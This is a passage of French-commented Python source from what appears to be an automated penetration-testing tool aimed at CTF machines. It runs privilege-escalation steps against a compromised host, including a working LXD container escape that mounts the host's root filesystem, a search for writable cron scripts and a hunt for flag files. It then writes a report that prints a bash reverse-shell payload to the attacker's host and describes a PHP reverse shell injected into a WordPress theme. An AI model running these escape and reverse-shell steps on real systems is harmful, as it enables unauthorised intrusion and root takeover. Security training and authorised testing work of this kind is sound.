                (privesc_dir / "privesc_method.txt").write_text(results["privesc_method"], encoding="utf-8")
                (privesc_dir / "privesc_id.txt").write_text(results["privesc_id"], encoding="utf-8")
        else:
            warn("Docker: aucune image disponible pour l'escalade")
            raw.append("Aucune image Docker disponible.\n")

    # ── 3. LXD/LXC group escape ──────────────────────────────────────────────
    if "lxd" in id_result.lower() and "privesc_method" not in results:
        raw.append("### LXD group détecté — tentative d'escalade\n")
        info("[*] LXD group détecté — tentative d'escalade")

        # Vérifier les containers disponibles
        lxc_list = _send("lxc image list 2>/dev/null | head -10", wait=5.0)
        raw.append(f"Images LXC:\n{lxc_list}\n")

        # LXD escape : créer un container privilegié et monter /
        lxd_cmds = [
            "lxc init ubuntu:18.04 privesc -c security.privileged=true 2>/dev/null || "
            "lxc init alpine privesc -c security.privileged=true 2>/dev/null",
            "lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true 2>/dev/null",
            "lxc start privesc 2>/dev/null",
            "lxc exec privesc -- chroot /mnt/root /bin/bash -c 'cat /root/root.txt 2>/dev/null; id'",
        ]
        for lcmd in lxd_cmds:
            out = _send(lcmd, wait=8.0)
            raw.append(f"$ {lcmd[:60]}\n{out}\n")
            if "root" in out.lower() and ("uid=0" in out or "THM{" in out or "flag" in out.lower()):
                ok(f"[+] LXD escape réussi!")
                results["privesc_method"] = "LXD group escape"
                results["privesc_id"] = out.strip()[:200]
                raw.append("[+] LXD ESCAPE RÉUSSI!\n")
                (privesc_dir / "privesc_method.txt").write_text(results["privesc_method"], encoding="utf-8")
                (privesc_dir / "privesc_id.txt").write_text(results["privesc_id"], encoding="utf-8")
                break

    # ── 4. Writable scripts dans cron ────────────────────────────────────────
    if "privesc_method" not in results:
        raw.append("### Recherche scripts cron writables\n")
        # Trouver les scripts exécutés par cron qui sont modifiables
        writable_cron = _send(
            "for f in $(find /etc/cron* /var/spool/cron /opt /home -name '*.sh' 2>/dev/null); do "
            "[ -w \"$f\" ] && echo \"WRITABLE: $f\"; done 2>/dev/null | head -10",
            wait=6.0
        )
        raw.append(writable_cron + "\n")

        writable_scripts = [l.replace("WRITABLE: ", "").strip()
                            for l in writable_cron.splitlines()
                            if l.startswith("WRITABLE:")]

        if writable_scripts:
            ok(f"[+] Scripts cron writables: {writable_scripts[:3]}")
            results["writable_cron_scripts"] = writable_scripts

            # Vérifier si le lhost est dispo pour un reverse shell
            if hasattr(results, "__dict__"):
                pass  # On n'a pas cfg ici, on laisse pour le rapport

            (privesc_dir / "writable_cron_scripts.txt").write_text(
                "\n".join(writable_scripts), encoding="utf-8"
            )
            raw.append(f"[!] {len(writable_scripts)} script(s) cron writable(s) → potentiel d'escalade\n")

    # ── Flags CTF — chercher automatiquement ─────────────────────────────────
    raw.append("### Recherche de flags CTF\n")
    flag_locations = [
        "/root/root.txt", "/home/*/user.txt", "/home/*/flag.txt",
        "/root/flag.txt", "/opt/flag.txt", "/tmp/flag.txt",
    ]
    for flag_path in flag_locations:
        cmd_flag = f"cat {flag_path} 2>/dev/null"
        flag_content = _send(cmd_flag, wait=3.0)
        # bash -i répète la commande en 1ère ligne → on la skip
        all_lines = flag_content.strip().splitlines()
        # Ignorer lignes qui sont l'écho de la commande, le prompt, ou trop courtes
        value_lines = []
        for line in all_lines:
            line = line.strip()
            if not line:
                continue
            if line.endswith("$") or line.endswith("#"):
                continue
            if len(line) <= 5:
                continue
            if "cat " in line and flag_path.split("/")[-1] in line:
                continue   # écho commande
            if line.endswith("2>/dev/null"):
                continue   # variante écho
            value_lines.append(line)
        for line in value_lines:
            ok(f"[+] FLAG trouvé ({flag_path}): {line[:80]}")
            raw.append(f"FLAG [{flag_path}]: {line}\n")
            results.setdefault("flags_found", []).append({
                "path": flag_path, "value": line
            })
            (privesc_dir / f"flag_{Path(flag_path).name}").write_text(line, encoding="utf-8")
            break

    # Sauvegarder le log complet
    (privesc_dir / "advanced_privesc.txt").write_text("".join(raw), encoding="utf-8")
    results["raw"] = "".join(raw)
    return results


# -------------------- REPORTING --------------------

def _read_log(path, max_lines: int = 200) -> str:
    """Lit un fichier log et retourne son contenu tronqué si nécessaire."""
    try:
        p = Path(path)
        if not p.exists():
            return "_fichier introuvable_"
        content = p.read_text(encoding="utf-8", errors="replace").strip()
        lines = content.splitlines()
        if len(lines) > max_lines:
            kept = lines[:max_lines]
            kept.append(f"\n_[... {len(lines) - max_lines} lignes supplémentaires — voir {p.name}]_")
            return "\n".join(kept)
        return content
    except Exception as e:
        return f"_erreur lecture: {e}_"


def write_report(
    run_dir: Path,
    cfg: Config,
    services: List[dict],
    findings: List[dict],
    urls: List[str],
    web_logs: Dict[str, List[str]],
    timings: Dict[str, float],
) -> Path:
    logs_dir = run_dir / "logs"
    postexploit_dir = logs_dir / "post_exploit" if logs_dir.exists() else None

    def esc(x: str) -> str:
        return (x or "").replace("|", "\\|")

    def h1(t): return f"\n# {t}\n\n"
    def h2(t): return f"\n## {t}\n\n"
    def h3(t): return f"\n### {t}\n\n"
    def code(content, lang=""): return f"\n```{lang}\n{content}\n```\n"
    def sep(): return "\n---\n"

    def _pe_val(fname: str, skip_cmd: str = "") -> str:
        """Lit post_exploit/<fname>.txt et retourne la 1ère ligne significative."""
        fpath = postexploit_dir / f"{fname}.txt" if postexploit_dir else None
        if not fpath or not fpath.exists():
            return "N/A"
        lines = fpath.read_text(encoding="utf-8", errors="replace").strip().splitlines()
        for ln in lines:
            ln = ln.strip()
            if not ln:
                continue
            if skip_cmd and ln == skip_cmd:
                continue
            if ln.endswith("$") or ln.endswith("#"):
                continue
            return ln
        return "N/A"

    def _pe_full(fname: str) -> str:
        """Lit post_exploit/<fname>.txt et retourne le contenu sans echo ni prompt."""
        fpath = postexploit_dir / f"{fname}.txt" if postexploit_dir else None
        if not fpath or not fpath.exists():
            return ""
        lines = fpath.read_text(encoding="utf-8", errors="replace").strip().splitlines()
        cleaned = [ln for ln in lines if not (ln.strip().endswith("$") or ln.strip().endswith("#"))]
        if cleaned and cleaned[0].strip() == fname.replace("_", " ").split()[0]:
            cleaned = cleaned[1:]
        return "\n".join(cleaned).strip()

    sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    sev_icon  = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🔵", "info": "⚪"}

    # ── Classer les findings ──────────────────────────────────────────────────
    all_findings_sorted = sorted(findings, key=lambda x: sev_order.get(x.get("severity","info"), 4))
    expl_findings = [f for f in findings if f.get("phase") == "exploitation"]
    ia_findings   = [f for f in findings if f.get("phase") == "initial_access"]
    pe_findings   = [f for f in findings if f.get("phase") == "post_exploitation"]

    shell_finding  = next((f for f in ia_findings if f.get("shell_obtained")), None)
    privesc_method = shell_finding.get("privesc_method") if shell_finding else None
    privesc_id     = shell_finding.get("privesc_id")     if shell_finding else None
    got_root       = bool(privesc_id and ("uid=0" in privesc_id or "euid=0" in privesc_id or "root" in (privesc_id or "").lower()))
    # Identité shell : extraire la vraie ligne uid= (pas l'écho de la commande)
    shell_user_raw = shell_finding.get("user","?") if shell_finding else None
    if shell_user_raw:
        uid_line = next((l.strip() for l in (shell_user_raw or "").splitlines()
                         if l.strip().startswith("uid=")), shell_user_raw)
        shell_user = uid_line
    else:
        shell_user = _pe_val("id", skip_cmd="id")

    total_dur = sum(timings.values())
    critiques = [f for f in all_findings_sorted if f.get("severity") in ("critical","high")]

    # Données post-exploit nettoyées
    pe_id       = _pe_val("id",       "id")
    pe_whoami   = _pe_val("whoami",   "whoami")
    pe_hostname = _pe_val("hostname", "hostname")
    pe_uname    = _pe_val("uname",    "uname -a")
    pe_os       = _pe_val("os_release", "cat /etc/os-release 2>/dev/null | head -5")
    pe_shadow   = _pe_val("shadow_check")
    pe_sudo     = _pe_full("sudo_l")
    pe_network  = _pe_full("network")
    pe_writable = _pe_full("writable_dirs")
    pe_interesting = _pe_full("interesting")

    # Groupes à risque
    risky_groups = []
    if "lxd" in (pe_id or ""):    risky_groups.append("lxd (escalade container possible)")
    if "docker" in (pe_id or ""): risky_groups.append("docker (montage / root possible)")
    if "sudo" in (pe_id or ""):   risky_groups.append("sudo (vérifier sudo -l)")
    if "adm" in (pe_id or ""):    risky_groups.append("adm (lecture logs système)")

    has_pe_data = postexploit_dir and postexploit_dir.exists() and any(postexploit_dir.glob("*.txt"))

    md: List[str] = []

    # ════════════════════════════════════════════════════════════════════
    # PAGE DE GARDE
    # ════════════════════════════════════════════════════════════════════
    md.append(f"# Rapport de Test d'Intrusion — {cfg.target}\n\n")
    md.append(f"> Généré par **{APP_NAME} v{VERSION}** le {now_iso()}\n\n")
    md.append(f"| Champ | Valeur |\n|---|---|\n")
    md.append(f"| Cible | `{cfg.target}` |\n")
    md.append(f"| Run ID | `{cfg.run_id}` |\n")
    md.append(f"| Date | {now_iso()} |\n")
    md.append(f"| Durée totale | {total_dur:.0f}s ({total_dur/60:.1f} min) |\n")
    md.append(f"| Mode | `{cfg.scan_mode}` / preset `{cfg.preset}` |\n")
    md.append(f"| Attaquant (LHOST) | `{cfg.lhost or 'non défini'}` |\n")
    md.append("\n")

    # ════════════════════════════════════════════════════════════════════
    # 1. RÉSUMÉ EXÉCUTIF
    # ════════════════════════════════════════════════════════════════════
    md.append(h1("1. Résumé Exécutif"))

    if got_root:
        md.append("**🔴 COMPROMISSION TOTALE** — La cible a été entièrement compromise. Un accès root (effective UID 0) a été obtenu de manière automatisée à partir d'une connexion réseau non authentifiée.\n\n")
    elif shell_finding and shell_finding.get("shell_obtained"):
        md.append("**🟠 ACCÈS INITIAL OBTENU** — Un shell distant a été établi sur la cible avec les droits d'un utilisateur standard. L'élévation de privilèges vers root n'a pas été confirmée automatiquement.\n\n")
    elif expl_findings:
        md.append("**🟡 VULNÉRABILITÉS EXPLOITÉES** — Plusieurs vecteurs d'exploitation ont été confirmés mais aucun shell n'a été obtenu lors de ce run.\n\n")
    else:
        md.append("**🔵 RECONNAISSANCE COMPLÈTE** — La phase de reconnaissance s'est terminée avec succès. Aucune exploitation automatique n'a abouti.\n\n")

    md.append("Ce rapport présente les résultats du test d'intrusion automatisé réalisé sur la cible `{t}`. "
              "L'audit a couvert les phases de reconnaissance réseau, d'énumération des services, d'exploitation "
              "des vecteurs identifiés et de post-exploitation. Les logs bruts complets sont disponibles en **Annexe**.\n\n".format(t=cfg.target))

    md.append("### Chiffres clés\n\n")
    md.append(f"| Métrique | Résultat |\n|---|---|\n")
    md.append(f"| Services ouverts détectés | **{len(services)}** |\n")
    md.append(f"| URLs web détectées | **{len(urls)}** |\n")
    md.append(f"| Findings total | **{len(findings)}** |\n")
    md.append(f"| Critiques / High | **{len(critiques)}** |\n")
    md.append(f"| Shell obtenu | **{'✅ Oui' if shell_finding and shell_finding.get('shell_obtained') else '❌ Non'}** |\n")
    if pe_id and pe_id != "N/A":
        uid_short = pe_id.split(" ")[0] if " " in pe_id else pe_id
        md.append(f"| Utilisateur compromis | **`{uid_short}`** |\n")
    md.append(f"| Élévation root (privesc) | **{'✅ OUI via ' + str(privesc_method) if got_root else '❌ Non confirmée'}** |\n")
    md.append("\n")

    md.append("### Chaîne d'attaque\n\n")
    md.append("La séquence d'attaque suivante a été exécutée automatiquement :\n\n")
    chain_n = 1
    if services:
        ports = ", ".join(f"`{s['port']}/{s['name']}`" for s in services)
        md.append(f"{chain_n}. **Reconnaissance** — Nmap a découvert {len(services)} ports ouverts : {ports}.\n")
        chain_n += 1
    ftp_w = next((f for f in findings if f.get("source") == "ftp" and f.get("writable_dirs")), None)
    if ftp_w:
        md.append(f"{chain_n}. **FTP anonyme writable** — Le serveur FTP autorise la connexion anonyme et le dossier `{', '.join(ftp_w.get('writable_dirs',[]))}` est accessible en écriture. Des fichiers de configuration ont été téléchargés, révélant un script cron existant.\n")
        chain_n += 1
    _wp_brute_chain = next((f for f in findings if f.get("source") == "wordpress_bruteforce" and f.get("creds")), None)
    if _wp_brute_chain:
        _wc = _wp_brute_chain["creds"][0]
        md.append(f"{chain_n}. **WordPress Brute Force** — Les credentials `{_wc['user']}:{_wc['password']}` ont été découverts via brute force WPScan. Accès administrateur (`/wp-admin`) obtenu.\n")
        chain_n += 1
    _wp_inject_chain = next((f for f in findings if f.get("source") == "wp_theme_inject"), None)
    if _wp_inject_chain:
        _theme = _wp_inject_chain.get("theme", "?")
        md.append(f"{chain_n}. **WordPress Theme Injection** — Un payload PHP a été injecté dans `{_theme}/404.php` via l'éditeur de thème WordPress. Reverse shell déclenché vers `{cfg.lhost}:{cfg.lport}`.\n")
        chain_n += 1
    if shell_finding and shell_finding.get("shell_obtained"):
        md.append(f"{chain_n}. **Initial Access** — Un payload bash reverse shell a été uploadé dans le dossier FTP writable et exécuté automatiquement par le cron root. Un shell a été reçu en tant que `{pe_whoami or '?'}`.\n")
        chain_n += 1
    if has_pe_data:
        md.append(f"{chain_n}. **Post-exploitation** — Une fois le shell obtenu, une reconnaissance interne automatisée a été effectuée : utilisateurs, groupes, SUID, sudo, crontab, réseau, processus et fichiers sensibles.\n")
        chain_n += 1
    if got_root:
        md.append(f"{chain_n}. **Privilege Escalation** — Le binaire `{privesc_method}` (SUID, référencé dans GTFOBins) a permis d'obtenir un shell avec `euid=0(root)`.\n")
    md.append("\n")

    if critiques:
        md.append("### Findings critiques et high\n\n")
        for f in critiques:
            icon = sev_icon.get(f.get("severity","info"), "⚪")
            md.append(f"- {icon} **[{f.get('severity','').upper()}]** {f.get('title','')}\n")
        md.append("\n")

    md.append(sep())

    # ════════════════════════════════════════════════════════════════════
    # 2. SERVICES ET PORTS DÉCOUVERTS
    # ════════════════════════════════════════════════════════════════════
    md.append(h1("2. Services et Ports Découverts"))
    md.append(f"Le scan Nmap en mode `{cfg.scan_mode}` a identifié **{len(services)} service(s)** actif(s) sur la cible `{cfg.target}`. "
              "Le tableau ci-dessous présente un résumé des services détectés avec leurs versions.\n\n")

    md.append("| Port | Proto | Service | Produit | Version | Info |\n")
    md.append("|---:|:---:|---|---|---|---|\n")
    for s in services:
        md.append(f"| {s['port']} | {esc(s['proto'])} | {esc(s['name'])} | {esc(s['product'])} | {esc(s['version'])} | {esc(s['extrainfo'])} |\n")
    md.append("\n")

    for s in services:
        sname = (s.get("name") or "").lower()
        version = s.get("version","")
        if "ftp" in sname:
            md.append(f"- **Port {s['port']} (FTP)** : {s.get('product','')} {version}. Le FTP est un protocole non chiffré qui transmet les credentials en clair. Une attention particulière doit être portée à l'accès anonyme.\n")
        elif "ssh" in sname:
            md.append(f"- **Port {s['port']} (SSH)** : {s.get('product','')} {version}. Vérifier les CVE connues pour cette version (notamment CVE-2018-15473 pour l'énumération d'utilisateurs).\n")
        elif "smb" in sname or "netbios" in sname or s.get("port") in (139, 445):
            md.append(f"- **Port {s['port']} (SMB/Samba)** : {s.get('product','')} {version}. Le protocole SMB expose potentiellement des partages accessibles sans authentification.\n")
    md.append("\n")
    md.append("> Les sorties complètes de Nmap sont disponibles en **Annexe A**.\n\n")
    md.append(sep())

    # ════════════════════════════════════════════════════════════════════
    # 3. ANALYSE DE VULNÉRABILITÉS
    # ════════════════════════════════════════════════════════════════════
    md.append(h1("3. Analyse de Vulnérabilités"))
    md.append("Deux outils ont été utilisés pour identifier les vulnérabilités connues sur les services détectés.\n\n")

    # Searchsploit
    ss_log = next(logs_dir.glob("searchsploit*.txt"), None) if logs_dir.exists() else None
    if ss_log:
        md.append(h2("3.1 Searchsploit (Exploit-DB)"))
        md.append("Searchsploit a été exécuté sur les résultats Nmap afin de rechercher des exploits publics pour chaque service et version détectés. "
                  "Les résultats ci-dessous listent les exploits disponibles dans la base Exploit-DB.\n\n")
        # Extraire uniquement les lignes d'exploit (pas les headers searchsploit)
        ss_content = _read_log(ss_log, max_lines=60)
        exploit_lines = [l for l in ss_content.splitlines() if "|" in l and "---" not in l and "Exploit Title" not in l and l.strip()]
        if exploit_lines:
            md.append("**Exploits référencés :**\n\n")
            md.append("| Exploit | Chemin |\n|---|---|\n")
            for el in exploit_lines[:20]:
                parts = [p.strip() for p in el.split("|") if p.strip()]
                if len(parts) >= 2:
                    md.append(f"| {esc(parts[0])} | `{parts[1]}` |\n")
            md.append("\n> ⚠️ Ces exploits sont des *références* — leur applicabilité doit être vérifiée manuellement.\n\n")
        else:
            md.append("Aucun exploit direct trouvé pour les versions exactes détectées.\n\n")
        md.append("> Sortie complète en **Annexe B**.\n\n")

    # Nuclei
    nuclei_results_path = logs_dir / "nuclei_results.txt" if logs_dir.exists() else None
    md.append(h2("3.2 Nuclei (scanner de vulnérabilités)"))
    md.append("Nuclei a scanné la cible avec ses templates de détection (severity high et critical). "
              "Ce scanner vérifie automatiquement des centaines de CVE et mauvaises configurations connues.\n\n")
    nuclei_content = nuclei_results_path.read_text(encoding="utf-8", errors="replace").strip() if nuclei_results_path and nuclei_results_path.exists() else ""
    if nuclei_content:
        md.append("**Vulnérabilités détectées par Nuclei :**\n\n")
        md.append(code(nuclei_content, ""))
    else:
        md.append("Aucune vulnérabilité de niveau high/critical détectée par Nuclei sur les endpoints accessibles. "
                  "Les ports 443/80 étant fermés, les templates HTTP n'ont pas pu être exécutés.\n\n")
    md.append(sep())

    # ════════════════════════════════════════════════════════════════════
    # 4. ÉNUMÉRATION DES SERVICES
    # ════════════════════════════════════════════════════════════════════
    md.append(h1("4. Énumération des Services"))
    md.append("Cette section détaille les résultats de l'énumération approfondie de chaque service découvert. "
              "L'objectif est d'identifier des configurations faibles, des accès non authentifiés ou des informations sensibles exposées.\n\n")

    # FTP
    ftp_finding = next((f for f in findings if f.get("source") == "ftp"), None)
    if ftp_finding or (logs_dir.exists() and any(logs_dir.glob("exploit_ftp*.txt"))):
        md.append(h2("4.1 FTP (port 21)"))
        md.append(f"Le serveur FTP `{next((s.get('product','') + ' ' + s.get('version','') for s in services if 'ftp' in (s.get('name','') or '').lower()), 'vsftpd')}` "
                  "a été testé pour l'accès anonyme.\n\n")
        if ftp_finding and ftp_finding.get("writable_dirs"):
            md.append(f"**🔴 CRITIQUE — Accès anonyme avec écriture :** Le dossier `{', '.join(ftp_finding['writable_dirs'])}` "
                      "est accessible en lecture ET en écriture sans authentification. "
                      "Un attaquant peut déposer des fichiers arbitraires sur le serveur.\n\n")
        if ftp_finding and ftp_finding.get("files_downloaded"):
            downloaded = ftp_finding.get("files_downloaded", [])
            md.append(f"**Fichiers récupérés :** {len(downloaded)} fichier(s) téléchargés lors de l'énumération.\n\n")
            for fp in downloaded:
                fname = Path(fp).name
                md.append(f"- `{fname}`\n")
            md.append("\n")
        md.append("> Logs complets en **Annexe C**.\n\n")

    # SMB
    smb_finding = next((f for f in findings if f.get("source") == "exploit_smb"), None)
    if smb_finding or (logs_dir.exists() and any(logs_dir.glob("exploit_smb*.txt"))):
        md.append(h2("4.2 SMB / Samba (ports 139, 445)"))
        md.append("L'énumération SMB a été réalisée avec `smbclient`, `smbmap` et `enum4linux-ng` afin d'identifier "
                  "les partages accessibles, les utilisateurs et la configuration de sécurité du serveur.\n\n")
        if smb_finding and smb_finding.get("readable_shares"):
            md.append(f"**Partages lisibles sans authentification :** `{', '.join(smb_finding['readable_shares'])}`\n\n")
        # Enum4linux résumé
        e4l_log = next(logs_dir.glob("enum4linux*.txt"), None) if logs_dir.exists() else None
        if e4l_log:
            e4l_content = e4l_log.read_text(encoding="utf-8", errors="replace")
            users_found = [l for l in e4l_content.splitlines() if "username:" in l.lower()]
            shares_found = [l for l in e4l_content.splitlines() if "pics" in l.lower() or "print$" in l.lower() or "ipc$" in l.lower()]
            if users_found:
                md.append("**Utilisateurs découverts via RPC (session nulle) :**\n\n")
                for u in users_found[:5]:
                    md.append(f"- `{u.strip()}`\n")
                md.append("\n")
            md.append("Le serveur autorise les **sessions nulles** (authentification sans credentials), "
                      "permettant l'énumération d'utilisateurs, de partages et de politiques de mots de passe.\n\n")
        md.append("> Logs complets en **Annexe D**.\n\n")

    # SSH
    ssh_finding = next((f for f in findings if f.get("source") == "exploit_ssh"), None)
    if ssh_finding or (logs_dir.exists() and any(logs_dir.glob("exploit_ssh*.txt"))):
        md.append(h2("4.3 SSH (port 22)"))
        ssh_svc = next((s for s in services if "ssh" in (s.get("name","") or "").lower()), {})
        md.append(f"Le service SSH `{ssh_svc.get('product','')} {ssh_svc.get('version','')}` a été analysé "
                  "pour la CVE-2018-15473 (énumération d'utilisateurs via authentification par clé publique malformée).\n\n")
        if ssh_finding and ssh_finding.get("valid_users"):
            users = ssh_finding.get("valid_users", [])
            md.append(f"**Résultat :** {len(users)} utilisateur(s) testés. Tous ont retourné 'auth refused', "
                      "ce qui indique que le correctif CVE-2018-15473 a probablement été backporté. "
                      "Les résultats sont **non fiables** sur ce serveur.\n\n")
        md.append("> Logs complets en **Annexe E**.\n\n")

    if urls:
        md.append(h2("4.4 Énumération Web"))
        md.append(f"{len(urls)} URL(s) web ont été détectées et analysées.\n\n")
        md.append("\n".join(f"- `{u}`" for u in urls) + "\n\n")

    # ── WordPress ────────────────────────────────────────────────────────
    wp_recon_f  = next((f for f in findings if f.get("source") == "wpscan_recon"), None)
    wp_brute_f  = next((f for f in findings if f.get("source") == "wordpress_bruteforce"), None)
    wp_inject_f = next((f for f in findings if f.get("source") == "wp_theme_inject"), None)
    wp_log_exists = logs_dir.exists() and (logs_dir / "wpscan_recon.txt").exists()
    if wp_recon_f or wp_brute_f or wp_inject_f or wp_log_exists:
        md.append(h2("4.5 WordPress (WPScan)"))
        md.append("WPScan a été utilisé pour l'énumération WordPress : version, plugins, thèmes et utilisateurs.\n\n")

        if wp_recon_f:
            wp_url_str = wp_recon_f.get("wp_url", cfg.target)
            md.append(f"**URL WordPress détectée :** `{wp_url_str}`\n\n")
            if wp_recon_f.get("version"):
                md.append(f"**Version WordPress :** `{wp_recon_f['version']}`\n\n")
            if wp_recon_f.get("users"):
                md.append(f"**Utilisateurs énumérés :**\n\n")
                for u in wp_recon_f["users"][:10]:
                    md.append(f"- `{u}`\n")
                md.append("\n")
            if wp_recon_f.get("vuln_plugins"):
                md.append(f"**⚠️ Plugins vulnérables détectés :**\n\n")
                for p in wp_recon_f["vuln_plugins"][:5]:
                    md.append(f"- `{p}`\n")
                md.append("\n")
            if wp_recon_f.get("cves"):
                md.append(f"**CVE référencées :**\n\n")
                for c in wp_recon_f["cves"][:5]:
                    md.append(f"- `{c}`\n")
                md.append("\n")

        if wp_brute_f:
            brute_creds = wp_brute_f.get("creds", [])
            if brute_creds:
                md.append("**🔴 CRITIQUE — Credentials WordPress trouvés (brute force) :**\n\n")
                md.append("| Utilisateur | Mot de passe |\n|---|---|\n")
                for c in brute_creds:
                    md.append(f"| `{esc(c.get('user','?'))}` | `{esc(c.get('password','?'))}` |\n")
                md.append("\n")
                md.append("> ⚠️ Ces credentials donnent un accès administrateur au tableau de bord WordPress (`/wp-admin`). "
                          "Un attaquant peut modifier les fichiers du thème, uploader des plugins malveillants ou extraire la base de données.\n\n")
            else:
                md.append(f"*{wp_brute_f.get('detail', 'Aucun credential trouvé')}*\n\n")

        md.append("> Logs complets WPScan en **Annexe (WordPress)**.\n\n")

    md.append(sep())

    # ════════════════════════════════════════════════════════════════════
    # 5. EXPLOITATION
    # ════════════════════════════════════════════════════════════════════
    if expl_findings or ia_findings:
        md.append(h1("5. Exploitation"))
        md.append("Cette section documente les vecteurs d'exploitation confirmés et les accès obtenus sur la cible.\n\n")

        if expl_findings:
            md.append(h2("5.1 Vecteurs d'exploitation confirmés"))
            for f in sorted(expl_findings, key=lambda x: sev_order.get(x.get("severity","info"), 4)):
                icon = sev_icon.get(f.get("severity","info"), "⚪")
                md.append(f"#### {icon} [{f.get('severity','').upper()}] {f.get('title','')}\n\n")
                # Prose selon le type
                src = f.get("source","")
                if "ftp" in src:
                    md.append("Le serveur FTP autorise la connexion anonyme et expose un répertoire inscriptible. "
                              "Cette configuration permet à n'importe quel utilisateur non authentifié de déposer "
                              "des fichiers sur le serveur, ce qui constitue un vecteur d'exécution de code si "
                              "ces fichiers sont ensuite exécutés par un processus système (ex: tâche cron).\n\n")
                elif "smb" in src:
                    md.append("Le serveur SMB expose des partages accessibles en lecture sans authentification. "
                              "Les fichiers récupérés peuvent contenir des informations sensibles (credentials, "
                              "configurations, clés).\n\n")
                elif "ssh" in src:
                    md.append("L'énumération SSH a permis de tester des noms d'utilisateurs potentiels. "
                              "Bien que CVE-2018-15473 ne soit pas exploitable sur ce serveur (patch backporté), "
                              "la liste d'utilisateurs peut être utilisée pour des attaques par force brute SSH.\n\n")
                elif "wp_theme_inject" in src:
                    _wp_url_r = f.get("wp_url", cfg.target)
                    _theme_r  = f.get("theme", "?")
                    md.append(f"Les credentials WordPress découverts ont permis l'accès à l'interface d'administration "
                              f"`{_wp_url_r}/wp-admin`. Via l'éditeur de thème (`Appearance → Theme Editor`), "
                              f"le fichier `{_theme_r}/404.php` a été modifié pour inclure un payload PHP qui établit "
                              f"une connexion TCP inverse vers `{cfg.lhost}:{cfg.lport}`.\n\n")
                    if f.get("shell_obtained"):
                        md.append(f"**🔥 Résultat :** Shell obtenu depuis `{f.get('shell_addr','?')}`\n\n")
                        _wp_user = f.get("user","?")
                        if _wp_user and _wp_user != "?":
                            md.append(f"| Identité | `{_wp_user}` |\n\n")
                if f.get("writable_dirs"):
                    md.append(f"- **Répertoires writables :** `{', '.join(f['writable_dirs'])}`\n")
                if f.get("readable_shares"):
                    md.append(f"- **Partages lisibles :** `{', '.join(f['readable_shares'])}`\n")
                if f.get("valid_users"):
                    md.append(f"- **Utilisateurs valides :** `{', '.join(f['valid_users'][:10])}`\n")
                if f.get("files_downloaded"):
                    md.append(f"- **Fichiers téléchargés :** `{', '.join(Path(fp).name for fp in f['files_downloaded'])}`\n")
                md.append("\n")

        if ia_findings:
            md.append(h2("5.2 Initial Access — Reverse Shell"))
            md.append("L'accès initial a été obtenu en exploitant la combinaison FTP anonyme writable + tâche cron root. "
                      "Le payload suivant a été injecté dans le script existant `clean.sh` via FTP :\n\n")
            md.append(code(f"bash -i >& /dev/tcp/{cfg.lhost}/{cfg.lport} 0>&1", "bash"))
            md.append("Ce script est exécuté périodiquement par cron avec les droits de l'utilisateur courant. "
                      "Un listener a été lancé sur l'attaquant (`{lhost}:{lport}`) et le shell a été reçu "
                      "en provenance de la cible.\n\n".format(lhost=cfg.lhost, lport=cfg.lport))

            for f in ia_findings:
                if f.get("shell_obtained"):
                    md.append(f"**Résultat :** 🔥 Shell obtenu depuis `{f.get('shell_addr','?')}`\n\n")
                    md.append(f"| Champ | Valeur |\n|---|---|\n")
                    md.append(f"| Utilisateur | `{pe_id if pe_id != 'N/A' else f.get('user','?')}` |\n")
                    md.append(f"| Hostname | `{pe_hostname}` |\n")
                    md.append(f"| OS | `{pe_os}` |\n")
                    md.append(f"| Kernel | `{pe_uname}` |\n")
                    if f.get("privesc_method"):
                        md.append(f"| Escalade obtenue | `{f.get('privesc_method')}` |\n")
                    if f.get("privesc_id"):
                        md.append(f"| Identité post-escalade | `{f.get('privesc_id')}` |\n")
                    md.append("\n")

        md.append("> Logs complets (payload, listener, commandes) en **Annexe F**.\n\n")
        md.append(sep())

    # ════════════════════════════════════════════════════════════════════
    # 6. POST-EXPLOITATION — RECONNAISSANCE INTERNE
    # ════════════════════════════════════════════════════════════════════
    if has_pe_data or pe_findings:
        md.append(h1("6. Post-Exploitation — Reconnaissance Interne"))
        md.append("Une fois le shell obtenu, une série de commandes de reconnaissance interne a été exécutée "
                  "automatiquement afin de cartographier la surface d'attaque interne et d'identifier "
                  "des vecteurs d'élévation de privilèges.\n\n")

        md.append(h2("6.1 Identité et système"))
        md.append(f"| Champ | Valeur |\n|---|---|\n")
        if pe_id and pe_id != "N/A":      md.append(f"| Identité (`id`) | `{pe_id}` |\n")
        if pe_whoami and pe_whoami != "N/A":  md.append(f"| Utilisateur | `{pe_whoami}` |\n")
        if pe_hostname and pe_hostname != "N/A": md.append(f"| Hostname | `{pe_hostname}` |\n")
        if pe_uname and pe_uname != "N/A":   md.append(f"| Kernel | `{pe_uname}` |\n")
        if pe_os and pe_os != "N/A":       md.append(f"| OS | `{pe_os}` |\n")
        md.append("\n")

        if risky_groups:
            md.append("**Groupes à risque détectés :**\n\n")
            for rg in risky_groups:
                md.append(f"- ⚠️ `{rg}`\n")
            md.append("\n")

        md.append(h2("6.2 Accès et permissions"))

        # Shadow
        if pe_shadow and pe_shadow != "N/A":
            can_read = "r--" in pe_shadow or "shadow" in pe_shadow
            md.append(f"**Fichier `/etc/shadow` :** `{pe_shadow}`  \n")
            md.append("Le fichier shadow n'est pas lisible par l'utilisateur courant " if not can_read
                      else "⚠️ Le fichier shadow est potentiellement lisible.\n")
            md.append("\n")

        # Sudo
        if pe_sudo and pe_sudo.strip() and pe_sudo != "N/A":
            if "NOPASSWD" in pe_sudo:
                md.append(f"**⚠️ Droits sudo NOPASSWD détectés :**\n\n")
                md.append(code(pe_sudo, ""))
            else:
                md.append(f"**Droits sudo :** Aucune commande NOPASSWD disponible pour cet utilisateur.\n\n")
        else:
            md.append("**Droits sudo :** Aucun droit sudo disponible (`sudo -l` sans résultat).\n\n")

        md.append(h2("6.3 Réseau interne"))
        if pe_network and pe_network != "N/A":
            md.append("Les ports suivants sont ouverts en écoute sur l'hôte compromis :\n\n")
            md.append(code(pe_network, ""))
            md.append("Ces ports internes ne sont pas exposés directement depuis l'extérieur et pourraient "
                      "constituer des vecteurs de pivoting ou de mouvements latéraux.\n\n")

        md.append(h2("6.4 Fichiers et répertoires sensibles"))
        if pe_interesting and pe_interesting != "N/A":
            md.append("Les fichiers potentiellement sensibles suivants ont été détectés :\n\n")
            for line in pe_interesting.splitlines():
                if line.strip():
                    md.append(f"- `{line.strip()}`\n")
            md.append("\n")
        if pe_writable and pe_writable != "N/A":
